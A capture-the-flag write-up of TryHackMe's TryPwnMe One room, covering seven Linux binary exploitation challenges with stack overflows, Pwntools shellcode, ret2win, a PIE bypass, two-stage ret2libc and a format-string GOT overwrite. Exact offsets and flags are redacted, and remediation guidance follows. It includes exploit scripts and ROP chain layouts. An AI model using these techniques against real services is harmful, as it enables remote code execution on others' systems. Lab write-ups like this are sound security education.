# TryPwnMe One Challenge

![Banner](./../IMAGES/trypwnme_one_img.png?raw=true)

**Pathway:** *Standalone Challenge* | **Section:** *TryHackMe Challenges* | **Challenge:** *[TryPwnMe One](https://tryhackme.com/room/trypwnmeone)*

> [!IMPORTANT]
>
> **Working write-up notice:** This was a working and verified write-up at the time of writing on **26 July 2026**.
>
> **Spoiler warning:** This write-up documents the exploitation techniques and the order in which the challenges were solved. Exact flags, addresses, offsets, payload values and other direct challenge giveaways have been redacted.
>
> **Please note:** The IP addresses used during the lab were dynamically allocated by TryHackMe. The assessment was performed from my own Kali Linux VM in VMware Workstation, connected to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the TryHackMe target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents exact addresses, offsets, payload bytes, credentials, sensitive output or other challenge-specific giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **Licence:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on laboratories covering penetration testing, networking, web application security, privilege escalation, exploit development and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

TryPwnMe One is a collection of beginner-friendly binary exploitation challenges. The room introduces several fundamental exploit-development techniques through separate vulnerable Linux binaries exposed on different TCP ports.

The successful attack chain involved:

1. Confirming TryHackMe VPN connectivity and local hostname resolution.
2. Reviewing the supplied challenge files.
3. Inspecting ELF architecture and binary protections.
4. Analysing vulnerable functions with `objdump`, `nm` and Pwntools.
5. Overwriting local stack variables.
6. Executing shellcode from an executable stack.
7. Redirecting execution to a hidden `win()` function.
8. Bypassing PIE by calculating addresses from a runtime leak.
9. Building a two-stage ret2libc exploit with the supplied GNU C Library.
10. Exploiting an uncontrolled format string to overwrite a writable GOT entry.
11. Spawning remote shells and reading `flag.txt` after each successful exploit.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: trypwnme-one.thm
```

The supplied challenge files were extracted beneath:

```text
/tmp/VK/materials-TryPwnMeOne/
```

The target was added to the local hosts file:

```bash
echo "<TARGET_IP> trypwnme-one.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed using:

```bash
getent hosts trypwnme-one.thm
```

VPN routing and the tunnel address were checked with:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected route showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address.

Connectivity was then confirmed:

```bash
ping -c 6 trypwnme-one.thm
```

> [!TIP]
>
> When using your own Kali Linux VM, the `/etc/hosts` file is especially important for TryHackMe challenges. Rooms may depend on hostname-based routing, redirects, virtual hosts, cookies or application logic that will not behave correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become clogged with entries from previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A neglected hosts file eventually becomes DNS spaghetti - technically functional, but increasingly difficult to trust.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry for this room can be removed with:

```bash
sudo sed -i '/trypwnme-one\.thm/d' /etc/hosts
```

The correct mapping can then be added again using the target IP allocated to the current room instance.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip` for confirming VPN routing and the `tun0` address.
- `getent` for validating local hostname resolution.
- `ping` and Netcat for confirming connectivity to the target services.
- `find` and `ls` for locating the supplied challenge binaries and libraries.
- `file` for identifying ELF architecture, linking and symbol information.
- `checksec` for reviewing stack canaries, NX, PIE and RELRO.
- `objdump` for disassembling vulnerable functions.
- `nm` for locating symbols and PIE-relative function offsets.
- `ROPgadget` for identifying `ret` gadgets used for stack alignment.
- Pwntools for shellcode generation, packing addresses, parsing leaks and building ROP or format-string payloads.
- Python 3 for constructing and transmitting binary payloads.
- Netcat for direct interaction with remote challenge services.
- Standard Linux utilities such as `cat`, `grep`, `sed` and `head`.

Click [HERE](https://github.com/Valikahn/TryHackMe-Standalone-Challenge#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Supplied Challenge Files

The room files were enumerated from the working directory:

```bash
find /tmp/VK/materials-TryPwnMeOne -maxdepth 2 -type f -printf '%p\n'
```

The supplied material contained the following binaries:

```text
TryOverFlowMe1/overflowme1
TryOverFlowMe2/overflowme2
TryExecMe/tryexecme
TryRetMe/tryretme
RandomMemories/random
TheLibrarian/thelibrarian
NotSpecified/notspecified
```

The ret2libc challenge also supplied its expected runtime libraries:

```text
TheLibrarian/libc.so.6
TheLibrarian/ld-linux-x86-64.so.2
```

### Binary Identification

The first binary was inspected with:

```bash
file /tmp/VK/materials-TryPwnMeOne/TryOverFlowMe1/overflowme1
```

The result identified a 64-bit x86-64 ELF executable that was dynamically linked and not stripped. Symbols therefore remained available for analysis.

### Protection Review

Each challenge binary was inspected with `checksec` before exploitation:

```bash
checksec --file=/path/to/binary
```

The protections varied between challenges, but the relevant observations included:

- No stack canaries across the supplied vulnerable binaries.
- NX disabled for the direct shellcode execution challenge.
- NX enabled for the return-oriented challenges.
- No PIE for several binaries, providing fixed executable addresses.
- PIE enabled for the address-leak challenge.
- Partial RELRO for the format-string challenge, leaving the GOT writable.
- A supplied `libc.so.6` for the ret2libc challenge.

These results determined which exploitation technique was appropriate for each service.

## Exploits

### Challenge 1 - Overwriting a Boolean-Style Administrator Variable

The first service accepted a comment through the unsafe `gets()` function. A local integer named `admin` was initialised to zero and checked after the input was read.

The relevant binary was:

```text
TryOverFlowMe1/overflowme1
```

The `main()` function was disassembled:

```bash
objdump -d -M intel \
  /tmp/VK/materials-TryPwnMeOne/TryOverFlowMe1/overflowme1 \
  | sed -n '/<main>:/,/^$/p'
```

The disassembly showed that:

- The input buffer was stored at one stack offset.
- `admin` was stored closer to the saved frame pointer.
- The distance between the start of the buffer and `admin` was `<REDACTED>` bytes.
- The condition required only that `admin` became non-zero.

A payload was sent consisting of padding followed by a non-zero byte:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*<REDACTED> + b"B\n"
)' | nc trypwnme-one.thm 9003
```

The excess input overwrote `admin`, causing the program to enter the privileged branch and print:

```text
THM{....}
```

### Challenge 2 - Overwriting an Integer with a Required Magic Value

The second service used another `gets()` call, but this time `admin` had to equal a specific 32-bit value.

The relevant binary was:

```text
TryOverFlowMe2/overflowme2
```

The function was reviewed with:

```bash
objdump -d -M intel \
  /tmp/VK/materials-TryPwnMeOne/TryOverFlowMe2/overflowme2 \
  | sed -n '/<main>:/,/^$/p'
```

The disassembly revealed:

- The buffer began at `[rbp-<REDACTED>]`.
- `admin` was stored at `[rbp-<REDACTED>]`.
- The required overwrite distance was `<REDACTED>` bytes.
- The comparison expected the value `<REDACTED>`.

The required value consisted of four identical ASCII bytes, so the exploit used padding followed by the corresponding four-character sequence:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*<REDACTED> + b"<REDACTED>\n"
)' | nc trypwnme-one.thm 9004
```

The exact value was written into `admin`, causing the program to call its flag-reading function:

```text
THM{....}
```

### Challenge 3 - Direct Shellcode Execution

The third binary read attacker-controlled bytes into a stack buffer and then called that buffer as a function.

The relevant binary was:

```text
TryExecMe/tryexecme
```

Protection analysis showed:

```text
No stack canary
NX disabled
No PIE
```

Because NX was disabled, the stack was executable. Pwntools was used to generate 64-bit Linux shellcode:

```bash
python3 -c '
from pwn import *
context.clear(arch="amd64", os="linux")
print(asm(shellcraft.sh()).hex())
'
```

It was important to set the architecture explicitly. Without this, Pwntools initially attempted to assemble the AMD64 instructions using a 32-bit assembler context and returned operand-size errors.

The completed exploit connected to the remote service, waited for the prompt, transmitted the shellcode and then issued a command through the spawned shell:

```python
from pwn import *

context.clear(arch="amd64", os="linux")

io = remote("trypwnme-one.thm", 9005)
io.recvuntil(b"Give me your shell, and I will execute it: ")
io.send(asm(shellcraft.sh()))
io.sendline(b"cat flag.txt")
io.interactive()
```

The program executed the supplied bytes as machine code, spawned `/bin/sh` and returned:

```text
THM{....}
```

### Challenge 4 - Return to `win()`

The fourth binary contained a hidden `win()` function that executed `/bin/sh`. Its vulnerable function read far more data than the local stack buffer could safely hold.

The relevant binary was:

```text
TryRetMe/tryretme
```

The protections were:

```text
No stack canary
NX enabled
No PIE
```

The `win()` and `vuln()` functions were disassembled:

```bash
objdump -d -M intel \
  /tmp/VK/materials-TryPwnMeOne/TryRetMe/tryretme \
  | sed -n '/<win>:/,/^$/p;/<vuln>:/,/^$/p'
```

The stack layout showed a buffer of `<REDACTED>` bytes followed by the saved frame pointer. The saved return address was therefore reached after `<REDACTED>` bytes.

A clean `ret` gadget was found:

```bash
ROPgadget \
  --binary /tmp/VK/materials-TryPwnMeOne/TryRetMe/tryretme \
  --only "ret" | head
```

The alignment gadget and `win()` addresses are redacted:

```text
ret: <REDACTED>
win: <REDACTED>
```

The exploit structure was:

```python
payload  = b"A" * <REDACTED>
payload += p64(<REDACTED>)  # ret gadget for stack alignment
payload += p64(<REDACTED>)  # win()
```

The payload redirected execution through the alignment gadget and into `win()`. The resulting shell was used to read:

```text
THM{....}
```

### Challenge 5 - PIE Bypass Using a Runtime Function Leak

The fifth challenge also contained a `win()` function, but PIE was enabled. Fixed addresses from the local binary could not be used directly because the executable was relocated each time it ran.

The relevant binary was:

```text
RandomMemories/random
```

The protection output included:

```text
Full RELRO
No stack canary
NX enabled
PIE enabled
```

The binary deliberately disclosed the live runtime address of `vuln()`:

```text
I can give you a secret <REDACTED>
```

The local symbol offsets were identified with:

```bash
nm -n /tmp/VK/materials-TryPwnMeOne/RandomMemories/random \
  | grep -E ' (win|vuln)$'
```

The relative difference between `vuln()` and `win()` remains constant even when PIE changes the load base.

The calculation was:

```text
PIE base = leaked runtime address of vuln - local vuln offset
win      = PIE base + local win offset
ret      = PIE base + local ret-gadget offset
```

The first attempt returned directly to `win()`, but the process exited before providing a usable shell. This matched the room warning about Ubuntu stack alignment.

A PIE-relative `ret` gadget was therefore found:

```bash
ROPgadget \
  --binary /tmp/VK/materials-TryPwnMeOne/RandomMemories/random \
  --only "ret" | head
```

The final exploit:

1. Parsed the leaked `vuln()` address.
2. Calculated the PIE base.
3. Derived the runtime `ret` and `win()` addresses.
4. Sent `<REDACTED>` bytes of padding.
5. Returned through the `ret` gadget.
6. Entered `win()` and spawned `/bin/sh`.

The shell returned:

```text
THM{....}
```

### Challenge 6 - Two-Stage ret2libc

The sixth challenge provided the binary together with the exact dynamic loader and GNU C Library expected by the remote service.

The relevant files were:

```text
TheLibrarian/thelibrarian
TheLibrarian/libc.so.6
TheLibrarian/ld-linux-x86-64.so.2
```

The binary protections included:

```text
No stack canary
NX enabled
No PIE
Partial RELRO
```

The vulnerable function was reviewed:

```bash
objdump -d -M intel \
  /tmp/VK/materials-TryPwnMeOne/TheLibrarian/thelibrarian \
  | sed -n '/<vuln>:/,/^$/p'
```

The saved return address was reached after `<REDACTED>` bytes.

Pwntools extracted the required first-stage ROP components:

```python
from pwn import *

context.clear(arch="amd64")

elf = ELF(
    "/tmp/VK/materials-TryPwnMeOne/TheLibrarian/thelibrarian",
    checksec=False
)

rop = ROP(elf)

print(hex(elf.plt["puts"]))
print(hex(elf.got["puts"]))
print(hex(elf.symbols["main"]))
print(hex(rop.find_gadget(["pop rdi", "ret"]).address))
print(hex(rop.find_gadget(["ret"]).address))
```

All exact addresses are redacted:

```text
puts@plt: <REDACTED>
puts@got: <REDACTED>
main: <REDACTED>
pop rdi; ret: <REDACTED>
ret: <REDACTED>
```

#### Stage One - Leak `puts()`

The first ROP chain called `puts(puts@got)` and then returned to `main()`:

```text
padding
pop rdi; ret
puts@got
puts@plt
main
```

The raw output contained six bytes from the live address stored in the GOT.

#### Decoding the Leaked Address

The leak appeared as raw bytes rather than a normal hexadecimal string:

```text
<REDACTED>
```

On x86-64, addresses are stored in little-endian order. The first byte is therefore the least significant byte.

Pwntools decoded the leak by padding it to eight bytes and interpreting it as an unsigned 64-bit little-endian integer:

```python
puts_address = u64(leaked_bytes.ljust(8, b"\x00"))
```

This converted the raw byte sequence into a normal runtime address:

```text
<REDACTED>
```

The supplied libc offsets were retrieved with:

```python
from pwn import *

libc = ELF(
    "/tmp/VK/materials-TryPwnMeOne/TheLibrarian/libc.so.6",
    checksec=False
)

print(hex(libc.symbols["puts"]))
print(hex(libc.symbols["system"]))
print(hex(next(libc.search(b"/bin/sh\x00"))))
```

The runtime addresses were then calculated:

```text
libc base = leaked puts address - puts offset
system    = libc base + system offset
/bin/sh   = libc base + /bin/sh offset
```

#### Stage Two - Call `system("/bin/sh")`

The second ROP chain was:

```text
padding
ret
pop rdi; ret
address of "/bin/sh"
address of system()
```

The initial `ret` corrected stack alignment before entering libc.

Once `system("/bin/sh")` executed, the exploit sent:

```bash
cat flag.txt
```

The result was:

```text
THM{....}
```

### Challenge 7 - Format-String GOT Overwrite

The final binary read a username and passed it directly to `printf()`:

```c
printf(username);
```

This created an uncontrolled format-string vulnerability.

The relevant binary was:

```text
NotSpecified/notspecified
```

The protection output showed:

```text
Partial RELRO
No stack canary
NX enabled
No PIE
```

Partial RELRO was significant because the Global Offset Table remained writable.

The fixed `win()` address was identified:

```bash
nm -n /tmp/VK/materials-TryPwnMeOne/NotSpecified/notspecified \
  | grep -E ' (win|main)$'
```

The format-string argument offset was discovered by sending a recognisable marker followed by `%p` specifiers:

```python
from pwn import *

io = remote("trypwnme-one.thm", 9009)
io.recvuntil(b"Please provide your username\n")
io.sendline(
    b"AAAABBBB.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"
)
print(io.recvall(timeout=2))
```

The marker appeared as:

```text
0x4242424241414141
```

This value is the little-endian representation of the bytes:

```text
AAAABBBB
```

Its position showed that the controlled input was available at format-string argument `<REDACTED>`.

Pwntools was then used to generate a payload that overwrote `exit@got` with the address of `win()`:

```python
payload = fmtstr_payload(
    <REDACTED>,
    {elf.got["exit"]: elf.symbols["win"]},
    write_size="short"
)
```

Exact GOT addresses, function addresses and generated format-string directives are intentionally redacted.

The completed exploit sent the payload and allowed the program to continue normally. When the application called `exit(1)`, the modified GOT entry redirected execution to `win()` instead.

The resulting shell was used to read:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The allocated target and `tun0` addresses were confirmed. The local hostname `trypwnme-one.thm` was mapped to `<TARGET_IP>` in `/etc/hosts`.

### 2. Challenge File Review
The supplied binaries and the custom libc files were located beneath `/tmp/VK/materials-TryPwnMeOne/`.

### 3. Binary Protection Analysis
`file` and `checksec` established architecture, symbol availability, NX, PIE, RELRO and stack-canary status for each binary.

### 4. First Stack-Variable Overwrite
An unsafe `gets()` call allowed padding to reach the local `admin` variable. A non-zero byte changed the branch condition and revealed the first flag:

```text
THM{....}
```

### 5. Magic-Value Stack Overwrite
A second `gets()` overflow was used to overwrite `admin` with the exact 32-bit value expected by the comparison. The successful branch returned:

```text
THM{....}
```

### 6. Executable-Stack Shellcode
NX was disabled in the third binary. AMD64 `/bin/sh` shellcode was generated with Pwntools and executed directly from the input buffer:

```text
THM{....}
```

### 7. Basic ret2win
A stack overflow replaced the saved return address with a `ret` alignment gadget followed by `win()`. The spawned shell returned:

```text
THM{....}
```

### 8. PIE Address Calculation
A leaked runtime address of `vuln()` was used to calculate the PIE base. Runtime addresses for a `ret` gadget and `win()` were derived from their local offsets:

```text
THM{....}
```

### 9. libc Address Leak
The ret2libc challenge used `puts@plt` to print the live address held in `puts@got`. The leaked raw bytes were decoded as a little-endian 64-bit value.

### 10. ret2libc Shell
The leaked `puts()` address and supplied libc offsets were used to calculate the addresses of `system()` and `/bin/sh`. A second ROP chain executed `system("/bin/sh")`:

```text
THM{....}
```

### 11. Format-String Offset Discovery
A marker and repeated `%p` conversions identified the stack argument that referenced attacker-controlled data.

### 12. GOT Overwrite
The writable `exit@got` entry was replaced with the address of `win()`. The normal call to `exit()` was redirected into the hidden shell function:

```text
THM{....}
```

### 13. Final Objective
All seven remote exploitation challenges were completed in the order presented by the room.

## Key Lessons

TryPwnMe One demonstrated several important exploit-development and operational lessons:

- Confirm VPN routing and hostname resolution before debugging exploit behaviour.
- Keep `/etc/hosts` clear and limited to the room currently being worked on.
- Review every supplied binary with `file` and `checksec` before selecting an attack.
- Source code is helpful, but disassembly confirms the compiler's actual stack layout.
- The declared C type may not accurately communicate the effective byte size of a compiled stack allocation.
- `gets()` is inherently unsafe because it performs no bounds checking.
- A stack overflow does not always need to control the instruction pointer; overwriting a nearby variable may be sufficient.
- Endianness matters when writing integer values or interpreting leaked addresses.
- Pwntools architecture context should be set explicitly before assembling shellcode.
- NX determines whether injected stack bytes can be executed directly.
- No PIE provides stable executable addresses, while PIE requires a leak or another method of deriving the load base.
- A plain `ret` gadget is often required to maintain 16-byte stack alignment before calling functions on modern Ubuntu systems.
- Leaking a libc function address provides a basis for calculating the entire loaded libc image.
- Challenge-provided libraries should be used when calculating remote libc offsets.
- Raw pointer leaks may contain null bytes or appear as unreadable characters; inspect the raw response before assuming the exploit failed.
- `u64(leak.ljust(8, b"\x00"))` is a practical way to decode a short x86-64 pointer leak.
- Partial RELRO leaves GOT entries writable and can make function-pointer redirection possible.
- Passing attacker input directly to `printf()` creates a powerful read-and-write primitive.
- Exploit development is iterative. A failed shell can still prove that the return address calculation was correct.
- Exact flags, addresses and payload values should be removed from public write-ups to preserve the learning value of the challenge.

The main lesson was that each mitigation changed the route, rather than making exploitation impossible. The room progressed from simple data corruption to shellcode execution, return-oriented programming, address-space bypasses, libc reuse and arbitrary memory writes.

## Remediation Notes

### Unsafe Input Handling

- Remove all uses of `gets()`.
- Replace unbounded input functions with `fgets()` or another length-aware alternative.
- Ensure the maximum input length is derived from the destination buffer size.
- Check the return value of `read()` and reject oversized or truncated input.
- Avoid reading attacker-controlled data directly into stack objects without strict bounds.
- Compile with warnings enabled and treat dangerous-function warnings as build failures.

### Compiler and Linker Hardening

- Enable stack protection with `-fstack-protector-strong`.
- Compile position-independent executables with `-fPIE -pie`.
- Enable full RELRO with `-Wl,-z,relro,-z,now`.
- Keep NX enabled by linking with a non-executable stack.
- Use compiler hardening options such as `-D_FORTIFY_SOURCE=2` or newer supported equivalents.
- Enable control-flow protection where supported.
- Strip unnecessary symbols from production binaries.
- Use modern toolchains and maintain supported runtime libraries.

### Control-Flow Protection

- Remove hidden shell-spawning functions such as `win()` from production software.
- Do not leave direct calls to `system("/bin/sh")` in deployed executables.
- Apply control-flow integrity where supported.
- Use shadow stacks or hardware-backed return-address protection where available.
- Minimise reusable instruction sequences through current compiler hardening features.
- Treat information leaks as critical because they can defeat ASLR and PIE.

### Format-String Security

- Never pass untrusted input as the format argument to `printf()` or related functions.
- Use a constant format string:

```c
printf("%s", username);
```

- Enable full RELRO to prevent runtime GOT modification.
- Apply strict input-length validation even when a safe format string is used.
- Use static analysis to identify uncontrolled format strings.
- Compile with format warnings such as `-Wformat -Wformat-security`.
- Treat format-security warnings as errors in continuous integration.

### Memory Disclosure Prevention

- Avoid printing raw process addresses to untrusted users.
- Remove diagnostic pointer leaks from production builds.
- Do not expose stack, heap, code or library addresses in error messages.
- Clear sensitive buffers where appropriate.
- Use consistent error handling that does not disclose internal memory state.
- Monitor crashes and abnormal format-string patterns.

### Library and Runtime Security

- Keep glibc and the dynamic loader fully patched.
- Do not distribute unnecessary runtime libraries alongside production binaries.
- Verify library integrity and provenance.
- Use sandboxing, seccomp or container restrictions to reduce the impact of successful memory corruption.
- Run exposed services as dedicated, unprivileged accounts.
- Restrict filesystem access so a compromised process cannot read sensitive files.

### Service Isolation

- Do not store flags, secrets or credentials in the working directory of a remotely exposed process.
- Apply least-privilege file permissions.
- Use an isolated service account with access only to required resources.
- Restrict outbound and inbound network access to the minimum necessary.
- Apply process supervision and crash-rate alerting.
- Log repeated malformed requests and exploit-like input patterns.

### Operational Hygiene

- Keep `/etc/hosts` limited to active lab mappings.
- Remove stale room entries after each challenge.
- Maintain separate working directories for binaries, scripts, output and evidence.
- Record the current target IP, hostname and `tun0` address at the start of each session.
- Confirm architecture and protections before writing an exploit.
- Preserve raw output when debugging binary protocols or memory leaks.
- Redact dynamic IP addresses, exact flags and challenge-specific exploit values before publishing notes.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
